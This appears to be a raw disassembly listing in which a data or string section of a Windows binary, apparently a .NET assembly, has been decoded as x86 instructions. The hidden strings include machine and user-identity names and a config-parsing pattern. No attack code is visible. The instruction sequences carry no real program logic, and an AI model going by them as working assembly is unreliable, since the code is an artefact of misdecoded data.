  40774d:	outs   dx,BYTE PTR ds:[esi]
  40774e:	jae    0x407750
  407750:	inc    edi
  407751:	gs je  0x40779c
  407754:	outs   dx,DWORD PTR ds:[esi]
  407755:	jae    0x4077cb
  407757:	dec    esi
  407758:	popa   
  407759:	ins    DWORD PTR es:[edi],dx
  40775a:	add    BYTE PTR gs:[ecx+0x50],cl
  40775e:	inc    ecx
  40775f:	fs fs jb 0x4077c8
  407763:	jae    0x4077d8
  407765:	add    BYTE PTR [edi+0x65],al
  407768:	je     0x4077b2
  40776a:	outs   dx,DWORD PTR ds:[esi]
  40776b:	jae    0x4077e1
  40776d:	inc    ecx
  40776e:	fs fs jb 0x4077d7
  407772:	jae    0x4077e7
  407774:	gs jae 0x407777
  407777:	push   esp
  407778:	jb     0x4077f3
  40777a:	push   eax
  40777b:	popa   
  40777c:	jb     0x4077f1
  40777e:	add    BYTE PTR gs:[ecx+0x73],cl
  407782:	dec    esp
  407783:	outs   dx,DWORD PTR ds:[esi]
  407784:	outs   dx,DWORD PTR ds:[esi]
  407785:	jo     0x4077e9
  407787:	popa   
  407788:	arpl   WORD PTR [ebx+0x0],bp
  40778b:	dec    ecx
  40778c:	push   eax
  40778d:	dec    eax
  40778e:	outs   dx,DWORD PTR ds:[esi]
  40778f:	jae    0x407805
  407791:	inc    ebp
  407792:	outs   dx,BYTE PTR ds:[esi]
  407793:	je     0x407807
  407795:	jns    0x407797
  407797:	inc    edi
  407798:	gs je  0x4077e3
  40779b:	outs   dx,DWORD PTR ds:[esi]
  40779c:	jae    0x407812
  40779e:	inc    ebp
  40779f:	outs   dx,BYTE PTR ds:[esi]
  4077a0:	je     0x407814
  4077a2:	jns    0x4077a4
  4077a4:	addr16 gs je 0x407807
  4077a8:	inc    ecx
  4077a9:	fs fs jb 0x407812
  4077ad:	jae    0x407822
  4077af:	dec    esp
  4077b0:	imul   esi,DWORD PTR [ebx+0x74],0x73795300
  4077b7:	je     0x40781e
  4077b9:	ins    DWORD PTR es:[edi],dx
  4077ba:	cs dec esi
  4077bc:	gs je  0x4077ed
  4077bf:	push   ebx
  4077c0:	outs   dx,DWORD PTR ds:[esi]
  4077c1:	arpl   WORD PTR [ebx+0x65],bp
  4077c4:	je     0x407839
  4077c6:	add    BYTE PTR [ebx+0x6f],dl
  4077c9:	arpl   WORD PTR [ebx+0x65],bp
  4077cc:	je     0x407813
  4077ce:	js     0x407833
  4077d0:	gs jo  0x407847
  4077d3:	imul   ebp,DWORD PTR [edi+0x6e],0x646e4900
  4077da:	gs js  0x40782c
  4077dd:	data16 add BYTE PTR [ebx+0x75],dl
  4077e1:	bound  esi,QWORD PTR [ebx+0x74]
  4077e4:	jb     0x40784f
  4077e6:	outs   dx,BYTE PTR ds:[esi]
  4077e7:	add    BYTE PTR [bx+0x65],al
  4077eb:	je     0x407835
  4077ed:	push   edx
  4077ee:	inc    esi
  4077ef:	outs   dx,DWORD PTR ds:[esi]
  4077f0:	jb     0x40783e
  4077f2:	popa   
  4077f3:	jae    0x407869
  4077f5:	push   edi
  4077f6:	imul   ebp,DWORD PTR [esi+0x33],0x72724532
  4077fd:	outs   dx,DWORD PTR ds:[esi]
  4077fe:	jb     0x407800
  407800:	push   esp
  407801:	push   0x45776f72
  407806:	js     0x40786b
  407808:	gs jo  0x40787f
  40780b:	imul   ebp,DWORD PTR [edi+0x6e],0x48726f46
  407812:	push   edx
  407813:	add    BYTE PTR [ebx+0x74],dl
  407816:	jb     0x407881
  407818:	outs   dx,BYTE PTR ds:[esi]
  407819:	addr16 inc ebx
  40781b:	outs   dx,DWORD PTR ds:[esi]
  40781c:	ins    DWORD PTR es:[edi],dx
  40781d:	jo     0x407880
  40781f:	jb     0x40788a
  407821:	jae    0x407892
  407823:	outs   dx,BYTE PTR ds:[esi]
  407824:	add    BYTE PTR [ebx+0x74],dl
  407827:	popa   
  407828:	jb     0x40789e
  40782a:	jae    0x407883
  40782c:	imul   esi,DWORD PTR [eax+ebp*2+0x0],0x65726944
  407834:	arpl   WORD PTR [edi+ebp*2+0x72],si
  407838:	jns    0x40783a
  40783a:	inc    edi
  40783b:	gs je  0x407884
  40783e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x73],0x69784500
  407846:	jae    0x4078bc
  407848:	jae    0x40784a
  40784a:	push   ebp
  40784b:	outs   dx,BYTE PTR ds:[esi]
  40784c:	outs   dx,DWORD PTR fs:[esi]
  40784e:	add    BYTE PTR [ebx+0x68],al
  407851:	popa   
  407852:	jb     0x407854
  407854:	push   ebx
  407855:	jo     0x4078c3
  407857:	imul   esi,DWORD PTR [eax+eax*1+0x47],0x78457465
  40785f:	arpl   WORD PTR [ebp+0x70],sp
  407862:	je     0x4078cd
  407864:	outs   dx,DWORD PTR ds:[esi]
  407865:	outs   dx,BYTE PTR ds:[esi]
  407866:	inc    esi
  407867:	outs   dx,DWORD PTR ds:[esi]
  407868:	jb     0x4078b2
  40786a:	push   edx
  40786b:	add    BYTE PTR [ecx+0x44],cl
  40786e:	imul   esi,DWORD PTR [ebx+0x70],0x6261736f
  407875:	ins    BYTE PTR es:[edi],dx
  407876:	add    BYTE PTR gs:[ecx+ebp*2+0x73],al
  40787b:	jo     0x4078ec
  40787d:	jae    0x4078e4
  40787f:	add    BYTE PTR [edi+0x65],ah
  407882:	je     0x4078e3
  407884:	dec    ebp
  407885:	popa   
  407886:	arpl   WORD PTR [eax+0x69],bp
  407889:	outs   dx,BYTE PTR ds:[esi]
  40788a:	gs dec esi
  40788c:	popa   
  40788d:	ins    DWORD PTR es:[edi],dx
  40788e:	add    BYTE PTR gs:[ebx+0x6f],al
  407892:	ins    DWORD PTR es:[edi],dx
  407893:	jo     0x4078f6
  407895:	jb     0x4078fc
  407897:	add    BYTE PTR [edi+0x69],dl
  40789a:	outs   dx,BYTE PTR ds:[esi]
  40789b:	outs   dx,DWORD PTR fs:[esi]
  40789d:	ja     0x407912
  40789f:	inc    edx
  4078a0:	jne    0x40790b
  4078a2:	ins    BYTE PTR es:[edi],dx
  4078a3:	je     0x4078ee
  4078a5:	outs   dx,BYTE PTR ds:[esi]
  4078a6:	push   edx
  4078a7:	outs   dx,DWORD PTR ds:[esi]
  4078a8:	ins    BYTE PTR es:[edi],dx
  4078a9:	add    BYTE PTR gs:[ecx+0x73],cl
  4078ad:	dec    ecx
  4078ae:	outs   dx,BYTE PTR ds:[esi]
  4078af:	push   edx
  4078b0:	outs   dx,DWORD PTR ds:[esi]
  4078b1:	ins    BYTE PTR es:[edi],dx
  4078b2:	add    BYTE PTR gs:[ecx+0x49],cl
  4078b6:	fs outs dx,BYTE PTR gs:[esi]
  4078b9:	je     0x407924
  4078bb:	je     0x407936
  4078bd:	add    BYTE PTR [edi+0x65],ah
  4078c0:	je     0x407921
  4078c2:	dec    ecx
  4078c3:	fs outs dx,BYTE PTR gs:[esi]
  4078c6:	je     0x407931
  4078c8:	je     0x407943
  4078ca:	add    BYTE PTR [edi+0x65],ah
  4078cd:	je     0x40792e
  4078cf:	push   esp
  4078d0:	outs   dx,DWORD PTR ds:[esi]
  4078d1:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  4078d5:	dec    ecx
  4078d6:	jae    0x40791c
  4078d8:	imul   esp,DWORD PTR [edi+0x69],0x73490074
  4078df:	push   ebp
  4078e0:	jo     0x407952
  4078e2:	gs jb  0x4078e5
  4078e5:	dec    ecx
  4078e6:	jae    0x407934
  4078e8:	gs je  0x40795f
  4078eb:	gs jb  0x4078ee
  4078ee:	dec    ecx
  4078ef:	jae    0x40793e
  4078f1:	popa   
  4078f2:	je     0x407957
  4078f4:	push   0x74614d00
  4078f9:	push   0x776f5000
  4078fe:	add    BYTE PTR [edi+ebp*2+0x67],cl
  407902:	add    BYTE PTR [ecx+0x64],ah
  407905:	jbe    0x407968
  407907:	jo     0x407972
  407909:	xor    esi,DWORD PTR [edx]
  40790b:	cs fs ins BYTE PTR es:[edi],dx
  40790e:	ins    BYTE PTR es:[edi],dx
  40790f:	add    BYTE PTR [esi+0x65],cl
  407912:	je     0x407975
  407914:	jo     0x40797f
  407916:	xor    esi,DWORD PTR [edx]
  407918:	cs fs ins BYTE PTR es:[edi],dx
  40791b:	ins    BYTE PTR es:[edi],dx
  40791c:	add    BYTE PTR [edi+0x65],al
  40791f:	je     0x40796a
  407921:	outs   dx,BYTE PTR ds:[esi]
  407922:	jbe    0x407985
  407924:	ins    BYTE PTR es:[edi],dx
  407925:	imul   esp,DWORD PTR [eax+edx*2+0x61],0x68436874
  40792d:	popa   
  40792e:	jb     0x4079a3
  407930:	add    BYTE PTR [ecx+0x72],al
  407933:	jb     0x407996
  407935:	jns    0x407937
  407937:	inc    ebx
  407938:	outs   dx,DWORD PTR ds:[esi]
  407939:	jo     0x4079b4
  40793b:	push   esp
  40793c:	outs   dx,DWORD PTR ds:[esi]
  40793d:	add    BYTE PTR [ecx+0x6e],cl
  407940:	fs gs js 0x407993
  407944:	inc    cx
  407946:	outs   dx,BYTE PTR ds:[esi]
  407947:	jns    0x407949
  407949:	inc    edi
  40794a:	gs je  0x407996
  40794d:	outs   dx,BYTE PTR ds:[esi]
  40794e:	jbe    0x4079b1
  407950:	ins    BYTE PTR es:[edi],dx
  407951:	imul   esp,DWORD PTR [esi+eax*2+0x69],0x614e656c
  407959:	ins    DWORD PTR es:[edi],dx
  40795a:	gs inc ebx
  40795c:	push   0x737261
  407961:	dec    ecx
  407962:	outs   dx,BYTE PTR ds:[esi]
  407963:	je     0x407998
  407965:	xor    al,BYTE PTR [eax]
  407967:	inc    edi
  407968:	gs je  0x4079b1
  40796b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x656d61
  407973:	inc    esp
  407974:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  40797b:	jns    0x4079d0
  40797d:	gs jo  0x4079e1
  407980:	jb     0x4079e3
  407982:	je     0x4079f3
  407984:	jb     0x4079c9
  407986:	push   0x4c007261
  40798b:	popa   
  40798c:	jae    0x407a02
  40798e:	dec    ecx
  40798f:	outs   dx,BYTE PTR ds:[esi]
  407990:	fs gs js 0x4079e3
  407994:	data16 add BYTE PTR [ebx+0x79],dl
  407998:	jae    0x407a0e
  40799a:	gs ins DWORD PTR es:[edi],dx
  40799c:	cs push ebx
  40799e:	arpl   WORD PTR gs:[ebp+0x72],si
  4079a2:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x65766e55
  4079aa:	jb     0x407a15
  4079ac:	imul   sp,WORD PTR [ecx+0x62],0x656c
  4079b2:	inc    ebx
  4079b3:	outs   dx,DWORD PTR ds:[esi]
  4079b4:	fs gs inc ecx
  4079b7:	je     0x407a2d
  4079b9:	jb     0x407a24
  4079bb:	bound  esi,QWORD PTR [ebp+0x74]
  4079be:	add    BYTE PTR gs:[ecx+0x69],cl
  4079c2:	jae    0x407a09
  4079c4:	js     0x407a36
  4079c6:	jb     0x407a2d
  4079c8:	jae    0x407a3d
  4079ca:	popa   
  4079cb:	fs ins DWORD PTR es:[edi],dx
  4079cd:	imul   ebp,DWORD PTR [esi+0x43],0x522e646d
  4079d4:	gs jae 0x407a46
  4079d7:	jne    0x407a4b
  4079d9:	arpl   WORD PTR [ebp+0x2e],sp
  4079dc:	jb     0x407a43
  4079de:	jae    0x407a4f
  4079e0:	jne    0x407a54
  4079e2:	arpl   WORD PTR [ebp+0x73],sp
  4079e5:	add    BYTE PTR [eax],al
  4079e7:	add    BYTE PTR [eax],al
  4079e9:	add    esp,DWORD PTR [eax]
  4079eb:	add    BYTE PTR [eax],al
  4079ed:	xor    DWORD PTR [ebx+0x0],edx
  4079f0:	inc    ebp
  4079f1:	add    BYTE PTR [eax+eax*1+0x55],dl
  4079f5:	add    BYTE PTR [eax+0x0],dl
  4079f8:	inc    esi
  4079f9:	add    BYTE PTR [edx+0x0],dl
  4079fc:	dec    ecx
  4079fd:	add    BYTE PTR [ebp+0x0],al
  407a00:	dec    esi
  407a01:	add    BYTE PTR [eax+eax*1+0x4c],al
  407a05:	add    BYTE PTR [ecx+0x0],bl
  407a08:	dec    eax
  407a09:	add    BYTE PTR [edi+0x0],cl
  407a0c:	push   ebx
  407a0d:	add    BYTE PTR [eax+eax*1+0x4e],dl
  407a11:	add    BYTE PTR [ecx+0x0],al
  407a14:	dec    ebp
  407a15:	add    BYTE PTR [ebp+0x0],al
  407a18:	push   ebp
  407a19:	add    BYTE PTR [edx+0x0],dl
  407a1c:	dec    esp
  407a1d:	add    BYTE PTR [eax],al
  407a1f:	xor    eax,DWORD PTR [eax+eax*1+0x45]
  407a23:	add    BYTE PTR [eax+eax*1+0x45],cl
  407a27:	add    BYTE PTR [eax+eax*1+0x45],dl
  407a2b:	add    BYTE PTR [esi+0x0],al
  407a2e:	push   edx
  407a2f:	add    BYTE PTR [ecx+0x0],cl
  407a32:	inc    ebp
  407a33:	add    BYTE PTR [esi+0x0],cl
  407a36:	inc    esp
  407a37:	add    BYTE PTR [eax+eax*1+0x59],cl
  407a3b:	add    BYTE PTR [eax+0x0],cl
  407a3e:	dec    edi
  407a3f:	add    BYTE PTR [ebx+0x0],dl
  407a42:	push   esp
  407a43:	add    BYTE PTR [esi+0x0],cl
  407a46:	inc    ecx
  407a47:	add    BYTE PTR [ebp+0x0],cl
  407a4a:	inc    ebp
  407a4b:	add    BYTE PTR [ebp+0x0],dl
  407a4e:	push   edx
  407a4f:	add    BYTE PTR [eax+eax*1+0x0],cl
  407a53:	pop    ss
  407a54:	push   ebx
  407a55:	add    BYTE PTR [ebp+0x0],al
  407a58:	push   esp
  407a59:	add    BYTE PTR [ebp+0x0],dl
  407a5c:	push   eax
  407a5d:	add    BYTE PTR [ebx+0x0],dl
  407a60:	push   ebx
  407a61:	add    BYTE PTR [eax+eax*1+0x55],cl
  407a65:	add    BYTE PTR [edx+0x0],dl
  407a68:	dec    esp
  407a69:	add    BYTE PTR [eax],al
  407a6b:	sbb    DWORD PTR [eax+eax*1+0x45],eax
  407a6f:	add    BYTE PTR [eax+eax*1+0x45],cl
  407a73:	add    BYTE PTR [eax+eax*1+0x45],dl
  407a77:	add    BYTE PTR [ebx+0x0],dl
  407a7a:	push   ebx
  407a7b:	add    BYTE PTR [eax+eax*1+0x55],cl
  407a7f:	add    BYTE PTR [edx+0x0],dl
  407a82:	dec    esp
  407a83:	add    BYTE PTR [eax],al
  407a85:	adc    DWORD PTR [ebx+0x0],edx
  407a88:	inc    ebp
  407a89:	add    BYTE PTR [eax+eax*1+0x55],dl
  407a8d:	add    BYTE PTR [eax+0x0],dl
  407a90:	push   ebp
  407a91:	add    BYTE PTR [edx+0x0],dl
  407a94:	dec    esp
  407a95:	add    BYTE PTR [eax],al
  407a97:	adc    eax,DWORD PTR [eax+eax*1+0x45]
  407a9b:	add    BYTE PTR [eax+eax*1+0x45],cl
  407a9f:	add    BYTE PTR [eax+eax*1+0x45],dl
  407aa3:	add    BYTE PTR [ebp+0x0],dl
  407aa6:	push   edx
  407aa7:	add    BYTE PTR [eax+eax*1+0x0],cl
  407aab:	pop    ss
  407aac:	inc    esp
  407aad:	add    BYTE PTR [ecx+0x0],cl
  407ab0:	inc    ecx
  407ab1:	add    BYTE PTR [edi+0x0],al
  407ab4:	dec    esi
  407ab5:	add    BYTE PTR [edi+0x0],cl
  407ab8:	push   ebx
  407ab9:	add    BYTE PTR [ebp+0x0],al
  407abc:	push   ebp
  407abd:	add    BYTE PTR [edx+0x0],dl
  407ac0:	dec    esp
  407ac1:	add    BYTE PTR [eax],al
  407ac3:	and    DWORD PTR [ebx+0x0],edx
  407ac6:	dec    eax
  407ac7:	add    BYTE PTR [edi+0x0],cl
  407aca:	push   edi
  407acb:	add    BYTE PTR [ebx+0x0],al
  407ace:	inc    ebp
  407acf:	add    BYTE PTR [edx+0x0],dl
  407ad2:	push   esp
  407ad3:	add    BYTE PTR [ecx+0x0],cl
  407ad6:	inc    esi
  407ad7:	add    BYTE PTR [ecx+0x0],cl
  407ada:	inc    ebx
  407adb:	add    BYTE PTR [ecx+0x0],al
  407ade:	push   esp
  407adf:	add    BYTE PTR [ebp+0x0],al
  407ae2:	push   ebx
  407ae3:	add    BYTE PTR [eax],al
  407ae5:	and    DWORD PTR [ebx+0x0],edx
  407ae8:	inc    ebp
  407ae9:	add    BYTE PTR [eax+eax*1+0x55],dl
  407aed:	add    BYTE PTR [eax+0x0],dl
  407af0:	inc    esp
  407af1:	add    BYTE PTR [ebp+0x0],al
  407af4:	inc    esi
  407af5:	add    BYTE PTR [ecx+0x0],al
  407af8:	push   ebp
  407af9:	add    BYTE PTR [eax+eax*1+0x54],cl
  407afd:	add    BYTE PTR [ebp+0x0],dl
  407b00:	push   edx
  407b01:	add    BYTE PTR [eax+eax*1+0x53],cl
  407b05:	add    BYTE PTR [eax],al
  407b07:	and    eax,0x4c0043
  407b0c:	inc    ebp
  407b0d:	add    BYTE PTR [ecx+0x0],al
  407b10:	dec    esi
  407b11:	add    BYTE PTR [ebp+0x0],dl
  407b14:	push   eax
  407b15:	add    BYTE PTR [eax+eax*1+0x45],al
  407b19:	add    BYTE PTR [esi+0x0],al
  407b1c:	inc    ecx
  407b1d:	add    BYTE PTR [ebp+0x0],dl
  407b20:	dec    esp
  407b21:	add    BYTE PTR [eax+eax*1+0x55],dl
  407b25:	add    BYTE PTR [edx+0x0],dl
  407b28:	dec    esp
  407b29:	add    BYTE PTR [ebx+0x0],dl
  407b2c:	add    BYTE PTR ds:0x520043,dh
  407b32:	inc    ebp
  407b33:	add    BYTE PTR [ecx+0x0],al
  407b36:	push   esp
  407b37:	add    BYTE PTR [ebp+0x0],al
  407b3a:	inc    ecx
  407b3b:	add    BYTE PTR [ebx+0x0],dl
  407b3e:	push   eax
  407b3f:	add    BYTE PTR [esi+0x0],cl
  407b42:	inc    ebp
  407b43:	add    BYTE PTR [eax+eax*1+0x48],dl
  407b47:	add    BYTE PTR [edi+0x0],cl
  407b4a:	push   ebx
  407b4b:	add    BYTE PTR [eax+eax*1+0x43],dl
  407b4f:	add    BYTE PTR [edi+0x0],cl
  407b52:	dec    esi
  407b53:	add    BYTE PTR [esi+0x0],al
  407b56:	dec    ecx
  407b57:	add    BYTE PTR [edi+0x0],al
  407b5a:	inc    esi
  407b5b:	add    BYTE PTR [ecx+0x0],cl
  407b5e:	dec    esp
  407b5f:	add    BYTE PTR [ebp+0x0],al
  407b62:	add    BYTE PTR [ebx],al
  407b64:	add    BYTE PTR cs:[eax],al
  407b67:	pop    es
  407b68:	jne    0x407b6a
  407b6a:	jb     0x407b6c
  407b6c:	ins    BYTE PTR es:[edi],dx
  407b6d:	add    BYTE PTR [eax],al
  407b6f:	popa   
  407b70:	arpl   WORD PTR [eax],ax
  407b72:	outs   dx,DWORD PTR ds:[esi]
  407b73:	add    BYTE PTR [esi+0x0],ch
  407b76:	data16 add BYTE PTR [ecx+0x0],ch
  407b7a:	add    BYTE PTR [si+0x0],bl
  407b7e:	je     0x407b80
  407b80:	add    BYTE PTR gs:[ebp+0x0],ch
  407b84:	jo     0x407b86
  407b86:	ins    BYTE PTR es:[edi],dx
  407b87:	add    BYTE PTR [ecx+0x0],ah
  407b8a:	je     0x407b8c
  407b8c:	add    BYTE PTR gs:[ebx+0x0],dh
  407b90:	pop    esp
  407b91:	add    BYTE PTR [eax+0x0],dl
  407b94:	add    BYTE PTR gs:[edx+0x0],dh
  407b98:	jae    0x407b9a
  407b9a:	outs   dx,DWORD PTR ds:[esi]
  407b9b:	add    BYTE PTR [esi+0x0],ch
  407b9e:	popa   
  407b9f:	add    BYTE PTR [eax+eax*1+0x57],ch
  407ba3:	add    BYTE PTR [ebp+0x0],ah
  407ba6:	bound  eax,QWORD PTR [eax]
  407ba8:	push   ebx
  407ba9:	add    BYTE PTR [ebp+0x0],ah
  407bac:	jb     0x407bae
  407bae:	jbe    0x407bb0
  407bb0:	add    BYTE PTR gs:[edx+0x0],dh
  407bb4:	pop    esp
  407bb5:	add    BYTE PTR [ecx+0x0],ah
  407bb8:	jae    0x407bba
  407bba:	jo     0x407bbc
  407bbc:	outs   dx,BYTE PTR ds:[esi]
  407bbd:	add    BYTE PTR [ebp+0x0],ah
  407bc0:	je     0x407bc2
  407bc2:	add    BYTE PTR cs:[ebx+0x0],ah
  407bc6:	outs   dx,DWORD PTR ds:[esi]
  407bc7:	add    BYTE PTR [esi+0x0],ch
  407bca:	data16 add BYTE PTR [ecx+0x0],ch
  407bce:	add    BYTE PTR [bx+si],al
  407bd1:	sub    DWORD PTR [ebx+0x0],esp
  407bd4:	outs   dx,DWORD PTR ds:[esi]
  407bd5:	add    BYTE PTR [esi+0x0],ch
  407bd8:	data16 add BYTE PTR [ecx+0x0],ch
  407bdc:	add    BYTE PTR [si+0x0],bl
  407be0:	popa   
  407be1:	add    BYTE PTR [ebx+0x0],dh
  407be4:	jo     0x407be6
  407be6:	outs   dx,BYTE PTR ds:[esi]
  407be7:	add    BYTE PTR [ebp+0x0],ah
  407bea:	je     0x407bec
  407bec:	add    BYTE PTR cs:[ebx+0x0],ah
  407bf0:	outs   dx,DWORD PTR ds:[esi]
  407bf1:	add    BYTE PTR [esi+0x0],ch
  407bf4:	data16 add BYTE PTR [ecx+0x0],ch
  407bf8:	add    BYTE PTR [bx+si],al
  407bfb:	sbb    esp,DWORD PTR [ecx+0x0]
  407bfe:	jae    0x407c00
  407c00:	jo     0x407c02
  407c02:	outs   dx,BYTE PTR ds:[esi]
  407c03:	add    BYTE PTR [ebp+0x0],ah
  407c06:	je     0x407c08
  407c08:	add    BYTE PTR cs:[ebx+0x0],ah
  407c0c:	outs   dx,DWORD PTR ds:[esi]
  407c0d:	add    BYTE PTR [esi+0x0],ch
  407c10:	data16 add BYTE PTR [ecx+0x0],ch
  407c14:	add    BYTE PTR [bx+si],al
  407c17:	add    eax,0x3f002f
  407c1c:	add    BYTE PTR ds:0x3f002d,al
  407c22:	add    DWORD PTR ds:0x68002d,eax
  407c28:	add    DWORD PTR ds:0x68002f,eax
  407c2e:	add    BYTE PTR [ebx+0x5b],ah
  407c31:	add    BYTE PTR [edi],ch
  407c33:	add    BYTE PTR ds:0x28005d00,ch
  407c39:	add    BYTE PTR [edi],bh
  407c3b:	add    BYTE PTR [eax+eax*1],bh
  407c3e:	jo     0x407c40
  407c40:	popa   
  407c41:	add    BYTE PTR [edx+0x0],dh
  407c44:	popa   
  407c45:	add    BYTE PTR [ebp+0x0],ch
  407c48:	pop    edi
  407c49:	add    BYTE PTR [esi+0x0],ch
  407c4c:	popa   
  407c4d:	add    BYTE PTR [ebp+0x0],ch
  407c50:	add    BYTE PTR gs:[esi],bh
  407c53:	add    BYTE PTR [eax+eax*1+0x77],bl
  407c57:	add    BYTE PTR [ebx],ch
  407c59:	add    BYTE PTR [ecx],ch
  407c5b:	add    BYTE PTR [eax],ch
  407c5d:	add    BYTE PTR [ebx+0x0],bl
  407c60:	cmp    al,BYTE PTR [eax]
  407c62:	and    BYTE PTR [eax],al
  407c64:	cmp    eax,0x28005d00
  407c69:	add    BYTE PTR [edi],bh
  407c6b:	add    BYTE PTR [eax+eax*1],bh
  407c6e:	jo     0x407c70
  407c70:	popa   
  407c71:	add    BYTE PTR [edx+0x0],dh
  407c74:	popa   
  407c75:	add    BYTE PTR [ebp+0x0],ch
  407c78:	pop    edi
  407c79:	add    BYTE PTR [esi+0x0],dh
  407c7c:	popa   
  407c7d:	add    BYTE PTR [eax+eax*1+0x75],ch
  407c81:	add    BYTE PTR [ebp+0x0],ah
  407c84:	add    BYTE PTR ds:[esi],ch
  407c87:	add    BYTE PTR [edx],ch
  407c89:	add    BYTE PTR [ecx],ch
  407c8b:	add    BYTE PTR [ecx],ch
  407c8d:	add    BYTE PTR [edi],bh
  407c8f:	add    BYTE PTR [eax+eax*1],ah
  407c92:	add    DWORD PTR ds:0x610070,edx
  407c98:	jb     0x407c9a
  407c9a:	popa   
  407c9b:	add    BYTE PTR [ebp+0x0],ch
  407c9e:	pop    edi
  407c9f:	add    BYTE PTR [esi+0x0],ch
  407ca2:	popa   
  407ca3:	add    BYTE PTR [ebp+0x0],ch
  407ca6:	add    BYTE PTR gs:[eax],al
  407ca9:	pop    ss
  407caa:	jo     0x407cac
  407cac:	popa   
  407cad:	add    BYTE PTR [edx+0x0],dh
  407cb0:	popa   
  407cb1:	add    BYTE PTR [ebp+0x0],ch
  407cb4:	pop    edi
  407cb5:	add    BYTE PTR [esi+0x0],dh
  407cb8:	popa   
  407cb9:	add    BYTE PTR [eax+eax*1+0x75],ch
  407cbd:	add    BYTE PTR [ebp+0x0],ah
  407cc0:	add    BYTE PTR [edi],al
  407cc2:	push   ebp
  407cc3:	add    BYTE PTR [edx+0x0],dl
  407cc6:	dec    esp
  407cc7:	add    BYTE PTR [eax],al
  407cc9:	or     DWORD PTR [eax+0x0],ecx
  407ccc:	inc    ecx
  407ccd:	add    BYTE PTR [ebx+0x0],dl
  407cd0:	dec    eax
  407cd1:	add    BYTE PTR [eax],al
  407cd3:	adc    DWORD PTR [ebx+0x0],eax
  407cd6:	inc    ebp
  407cd7:	add    BYTE PTR [edx+0x0],dl
  407cda:	push   esp
  407cdb:	add    BYTE PTR [eax+0x0],cl
  407cde:	inc    ecx
  407cdf:	add    BYTE PTR [ebx+0x0],dl
  407ce2:	dec    eax
  407ce3:	add    BYTE PTR [eax],al
  407ce5:	sbb    edx,DWORD PTR [ebp+0x0]
  407ce8:	push   ebx
  407ce9:	add    BYTE PTR [ebp+0x0],al
  407cec:	push   ebx
  407ced:	add    BYTE PTR [ebp+0x0],al
  407cf0:	dec    esp
  407cf1:	add    BYTE PTR [esi+0x0],al
  407cf4:	push   ebx
  407cf5:	add    BYTE PTR [ecx+0x0],cl
  407cf8:	inc    edi
  407cf9:	add    BYTE PTR [esi+0x0],cl
  407cfc:	inc    ebp
  407cfd:	add    BYTE PTR [eax+eax*1+0x0],al
  407d01:	or     edx,DWORD PTR [eax+0x0]
  407d04:	inc    ecx
  407d05:	add    BYTE PTR [ebp+0x0],dl
  407d08:	push   ebx
  407d09:	add    BYTE PTR [ebp+0x0],al
  407d0c:	add    BYTE PTR [edi],cl
  407d0e:	dec    edi
  407d0f:	add    BYTE PTR [ebp+0x0],dl
  407d12:	push   esp
  407d13:	add    BYTE PTR [eax+0x0],dl
  407d16:	inc    ecx
  407d17:	add    BYTE PTR [eax+eax*1+0x48],dl
  407d1b:	add    BYTE PTR [eax],al
  407d1d:	add    edx,DWORD PTR [esi+0x0]
  407d20:	add    BYTE PTR [edi],cl
  407d22:	push   esi
  407d23:	add    BYTE PTR [ebp+0x0],al
  407d26:	push   edx
  407d27:	add    BYTE PTR [edx+0x0],al
  407d2a:	dec    edi
  407d2b:	add    BYTE PTR [ebx+0x0],dl
  407d2e:	inc    ebp
  407d2f:	add    BYTE PTR [eax],al
  407d31:	add    ebp,DWORD PTR [edi]
  407d33:	add    BYTE PTR [eax],al
  407d35:	cmp    DWORD PTR [ebp+0x0],eax
  407d38:	ins    BYTE PTR es:[edi],dx
  407d39:	add    BYTE PTR [ebp+0x0],ah
  407d3c:	jbe    0x407d3e
  407d3e:	popa   
  407d3f:	add    BYTE PTR [eax+eax*1+0x69],dh
  407d43:	add    BYTE PTR [edi+0x0],ch
  407d46:	outs   dx,BYTE PTR ds:[esi]
  407d47:	add    BYTE PTR [edx],bh
  407d49:	add    BYTE PTR [ecx+0x0],al
  407d4c:	add    BYTE PTR fs:[ebp+0x0],ch
  407d50:	imul   eax,DWORD PTR [eax],0x69006e
  407d56:	jae    0x407d58
  407d58:	je     0x407d5a
  407d5a:	jb     0x407d5c
  407d5c:	popa   
  407d5d:	add    BYTE PTR [eax+eax*1+0x6f],dh
  407d61:	add    BYTE PTR [edx+0x0],dh
  407d64:	and    DWORD PTR [eax],eax
  407d66:	outs   dx,BYTE PTR ds:[esi]
  407d67:	add    BYTE PTR [ebp+0x0],ah
  407d6a:	ja     0x407d6c
  407d6c:	cmp    al,BYTE PTR [eax]
  407d6e:	add    BYTE PTR [ebx],al
  407d70:	inc    edx
  407d71:	add    BYTE PTR [eax],al
  407d73:	aaa    
  407d74:	dec    ecx
  407d75:	add    BYTE PTR [ecx+0x0],cl
  407d78:	push   ebx
  407d79:	add    BYTE PTR [ebp+0x0],al
  407d7c:	js     0x407d7e
  407d7e:	jo     0x407d80
  407d80:	jb     0x407d82
  407d82:	add    BYTE PTR gs:[ebx+0x0],dh
  407d86:	jae    0x407d88
  407d88:	inc    ecx
  407d89:	add    BYTE PTR [eax+eax*1+0x6d],ah
  407d8d:	add    BYTE PTR [ecx+0x0],ch
  407d90:	outs   dx,BYTE PTR ds:[esi]
  407d91:	add    BYTE PTR [ebx+0x0],al
  407d94:	ins    DWORD PTR es:[edi],dx
  407d95:	add    BYTE PTR [eax+eax*1+0x2e],ah
  407d99:	add    BYTE PTR [edx+0x0],dl
  407d9c:	add    BYTE PTR gs:[ebx+0x0],dh
  407da0:	outs   dx,DWORD PTR ds:[esi]
  407da1:	add    BYTE PTR [ebp+0x0],dh
  407da4:	jb     0x407da6
  407da6:	arpl   WORD PTR [eax],ax
  407da8:	add    BYTE PTR gs:[eax],al
  407dab:	and    DWORD PTR [ebx+0x0],eax
  407dae:	outs   dx,DWORD PTR ds:[esi]
  407daf:	add    BYTE PTR [ebp+0x0],ch
  407db2:	ins    DWORD PTR es:[edi],dx
  407db3:	add    BYTE PTR [ecx+0x0],ah
  407db6:	outs   dx,BYTE PTR ds:[esi]
  407db7:	add    BYTE PTR [eax+eax*1+0x43],ah
  407dbb:	add    BYTE PTR [edi+0x0],ch
  407dbe:	ins    DWORD PTR es:[edi],dx
  407dbf:	add    BYTE PTR [eax+0x0],dh
  407dc2:	ins    BYTE PTR es:[edi],dx
